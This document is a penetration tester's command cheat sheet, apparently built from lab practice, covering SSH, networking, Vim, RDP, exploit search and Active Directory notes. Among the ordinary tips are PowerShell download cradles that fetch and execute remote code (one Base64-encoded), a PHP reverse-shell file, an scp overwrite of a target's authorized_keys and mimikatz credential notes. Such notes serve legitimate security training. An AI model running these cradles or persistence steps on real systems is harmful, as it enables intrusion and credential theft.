# Useful Commands

<details>

<summary>Enable Shared Folder on Kali VM</summary>

```bash
sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
```

</details>

<details>

<summary>Powershell Download Cradle (Download &#x26; Execute)</summary>

```powershell
iex (New-Object Net.Webclient).DownloadString("http://IP/File")
```

</details>

<details>

<summary>SSH Legacy Connect</summary>

```bash
ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss -p 22000 j0hn@10.11.1.252
```

</details>

<details>

<summary>Running cmd.exe as admin user</summary>

```bash
powershell.exe Start-Process cmd.exe -Verb runAs
```

OR

* Win-R --> `cmd.exe` --> Ctrl-Shift-Enter

</details>

<details>

<summary>SSH</summary>

### SSH with specified private key

```bash
chmod 400 /home/kali/.ssh/id_rsa
ssh barry@10.11.67.208 -i /home/kali/.ssh/id_rsa
```

### Don't save SSH hostkey into known hosts

```bash
ssh student@192.168.131.52 -p 2222 -o "UserKnownHostsFile=/dev/null"
```

### Starts SSH server

```bash
systemctl start ssh
```

### To troubleshoot SSH configurations

```bash
/usr/sbin/sshd -T
```

### To show SSH config

```bash
vim /etc/ssh/sshd_config
```

</details>

<details>

<summary>Linux Netw Config</summary>

```bash
ifconfig eth1 192.168.200.10 netmask 255.255.255.0
ip route add 192.168.200.0/24 dev eth1
route add default gw 192.168.100.104 eth1
```

</details>

<details>

<summary>Search for exploits</summary>

```bash
searchsploit "Sync Breeze Enterprise 10.0.28"
```

```bash
searchsploit -m 42341
```

</details>

<details>

<summary>Vim</summary>

### Replace all occurrences from first line to last line.

```bash
:0,$s/search_term/replace_term/g
```

It has the syntax `:start_line_number,end_line_number s/<search_term>/<replace_term>/g`

### Match everything until colon (useful for cleaning hashes)

```regex
^[^:]*:
```

### Fix Indentation Error (python script)

```bash
gg=G
```

</details>

<details>

<summary>cURL POST Request</summary>

```bash
curl -X POST --data "code=2+2" http://192.168.120.36:50000/verify
```

</details>

<details>

<summary>Install Perl Packages</summary>

```bash
cpan install Package::Name
```

</details>

<details>

<summary>Copy File Contents To Clipboard</summary>

```bash
xclip -selection c /usr/share/webshells/php/php-reverse-shell.php
```

</details>

<details>

<summary>Terminator Shortcuts</summary>

* Ctrl-Shift-E: Split the view vertically.

- Ctrl-Shift-O: Split the view horizontally.

* Ctrl-Shift-P: Focus on the previous view.

- Ctrl-Shift-N: Focus on the next view.

* Ctrl-D: Close the view where the focus is on.

- Ctrl-Shift-Q: Exit terminator.

</details>

<details>

<summary>Command Prompt Disabled By Administrator</summary>

* Upload [http://didierstevens.com/files/software/cmd-dll\_v0\_0\_4.zip](http://didierstevens.com/files/software/cmd-dll_v0_0_4.zip)
* Run `cmd.exe` locally

</details>

<details>

<summary>Modifying Windows PATH</summary>

```bash
set PATH=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;%PATH%
```

</details>

<details>

<summary>Remove Windows Directory Recursively</summary>

```bash
rmdir /s /q c:\temp
```

</details>

<details>

<summary>CMD Windows Recursive Directory Listing</summary>

```bash
dir /s /b
```

</details>

<details>

<summary>Error Connecting via xfreerdp</summary>

```bash
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:rdp
# OR, if having a different connect error, also try:
xfreerdp /u:user /p:'password' /v:X.X.X.X /d:domain /sec:tls
# and if you want to have files and clipboard there:
xfreerdp +clipboard /u:user /p:'password' /v:X.X.X.X /d:domain /sec:<whatever> /drive:<absolute path to your local folder>,/
```

</details>

<details>

<summary>Saving Terminal Commands</summary>

```bash
script <filename>
exit
```

</details>

<details>

<summary>Snipping Tool (Ctrl-Win-S) Pic Location</summary>

```bash
C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.ScreenSketch_8wekyb3d8bbwe\TempState
```

</details>

<details>

<summary>Fixing gcc: error trying to exec ‘cc1’: execvp: No such file or directory</summary>

```bash
carlos@malbec:/home/carlos$ gcc root.c -o libmalbec.so -shared -fPIC -w
gcc: error trying to exec ‘cc1’: execvp: No such file or directory

# PATH variable has not been exported. 
# To fix this, we'll export this variable.
carlos@malbec:/home/carlos$ export
declare -x LS_COLORS=""
declare -x OLDPWD
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
declare -x TERM="xterm"

carlos@malbec:/home/carlos$ export PATH

carlos@malbec:/home/carlos$ export
declare -x LS_COLORS=""
declare -x OLDPWD
declare -x PATH="/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:."
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
declare -x TERM="xterm"
```

</details>

<details>

<summary>Can't recognize 'whoami' as an internal or external command, or batch script.</summary>

```bash
Z:\home\carlos>whoami
Can't recognize 'whoami' as an internal or external command, or batch script.
# --> use linux x86 payload instead!!!
```

</details>

<details>

<summary>Sudo (ALL) NOPASSWD: ALL to root account</summary>

```bash
sudo bash -i
```

</details>

<details>

<summary>List al the available MSFVenom payloads</summary>

```bash
msfvenom --help-formats
```

</details>

<details>

<summary>scp: Received message too long ||   scp: Ensure the remote shell produces no output for non-interactive sessions.</summary>

Means victim is running legacy SCP server --> req us to use legacy SCP protocol

* `-O` switch

```bash
scp -O -i id_rsa authorized_keys max@192.168.199.100:/home/max/.ssh/authorized_keys
```

</details>

<details>

<summary>B64 Encoding Using Powershell</summary>

```powershell
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

</details>

<details>

<summary>Print Specified lines</summary>

```bash
# Single line 43
sed -n 43p shellcoderunner.ps1 

# Lines 45-52
sed -n 45,52p shellcode_runner_template.cs
```

</details>

<details>

<summary>Running CMD as Admin CMD</summary>

```powershell
powershell -Command "Start-Process cmd -Verb RunAs"
```

</details>

<details>

<summary>Change Linux Owner</summary>

Change to Kali, from root

```bash
chown -hR kali .
```

</details>

<details>

<summary>John Pot File </summary>

```bash
~/.john/john.pot
```

</details>

<details>

<summary>Difference in TTL for Ping</summary>

```
TTL: 63 --> Linux
TTL: 127 --> Windows
```

</details>

<details>

<summary>NT Auth Vs NT System</summary>

NT Auth --> computer object part of AD --> mimikatz will obtain domain creds

NT System (Local Admin):

* If on Domain Controller --> will obtain domain creds
* If on non-DC --> will only obtain local creds

</details>

<details>

<summary>nxcdb (NetExec Database)</summary>

```bash
nxcdb
workspace create <name>
proto smb
creds
```

```bash
workspace list
```

</details>

<details>

<summary>Fixing KRB_AP_ERR_SKEW(Clock skew too great) error</summary>

```
sudo rdate -n 10.10.11.147
```

</details>
